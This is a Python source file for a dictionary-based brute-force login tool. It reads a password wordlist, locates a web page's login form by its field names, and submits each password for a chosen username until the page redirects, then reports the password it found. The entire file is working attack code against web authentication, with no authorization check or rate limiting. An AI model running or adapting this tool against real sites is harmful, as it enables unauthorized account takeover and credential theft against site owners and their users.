import sys
from time import time

from bs4 import BeautifulSoup
from httplib2 import Http
from robobrowser import RoboBrowser

from DictionaryReader import DictionaryReader
from Messages import Messages


class BruteForceLogin:

    args_dictionary = {}
    start_time = ""
    end_time = ""

    def __init__(self, args_dictionary):
        self.args_dictionary = args_dictionary
        passwords = self.read_dictionary()
        self.brute_force_login(passwords)

    def read_dictionary(self):
        dictionary_reader = DictionaryReader(self.args_dictionary["dict"])
        passwords = dictionary_reader.read()
        return passwords

    def brute_force_login(self, passwords):
        self.start_time = time()

        browser = self.set_browser()
        form = self.get_form(browser)

        username_to_enter = input(Messages.ENTER_USERNAME)

        for password in passwords:
            self.try_password(browser, form, password, username_to_enter)

        print(Messages.USERNAME_NOT_FOUND + username_to_enter + Messages.CLOSING_APPLICATION)
        sys.exit(1)

    def set_browser(self):
        browser = RoboBrowser(history=True)
        browser.open(self.args_dictionary["url"])
        return browser

    def get_form(self, browser):
        form_name = self.get_form_name()
        form = browser.get_form(form_name)
        return form

    def get_form_name(self):
        http = Http('.cache')
        response, content = http.request(self.args_dictionary["url"])
        forms = BeautifulSoup(content, "html.parser").findAll('form')

        for form in forms:
            str_form = form.prettify()
            if self.args_dictionary["username"] in str_form and self.args_dictionary["passname"] in str_form:
                str_after_name = str_form.split("id=\"", 1)[1]  # ex: <form name="uid" id="id">...
                                                                 # devient
                                                                 #  uid" id="id">

                return str_after_name.split("\"", 1)[0]  # ex: uid" id="id">
                                                         # devient
                                                         # uid

        print(Messages.FIELD_NAME_NOT_FOUND)
        sys.exit(1)

    def try_password(self, browser, form, password, username_to_enter):
        form[self.args_dictionary["username"]].value = username_to_enter
        form[self.args_dictionary["passname"]].value = password
        form.serialize()
        browser.submit_form(form)
        if browser.url != self.args_dictionary["url"]:
            minutes_elapsed = self.get_minutes_elapsed()
            print(Messages.PASSWORD_FOUND + minutes_elapsed + Messages.MINUTES + password)
            sys.exit(1)
        else:
            print(Messages.PASSWORD + password + Messages.HASNT_WORKED)

    def get_minutes_elapsed(self):
        self.end_time = time()
        hours, rem = divmod(self.end_time - self.start_time, 3600)
        minutes, seconds = divmod(rem, 60)
        return "{:0}".format(int(minutes))

